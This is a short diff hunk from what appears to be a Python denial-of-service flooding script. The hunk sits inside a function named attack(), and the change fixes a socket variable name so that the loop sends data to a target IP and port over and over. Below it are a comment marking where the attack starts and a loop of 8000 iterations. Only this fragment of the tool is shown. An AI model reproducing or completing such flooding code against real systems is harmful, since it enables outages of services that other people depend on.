@@ -70,7 +70,7 @@ def attack():
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       addr = (str(ip),int(port))
       for x in range(times):
-      s.sendto(data,addr)
+      atk.sendto(data,addr)
       atk.connect((ip, port))
       #Attack starts here
       for y in range(8000):
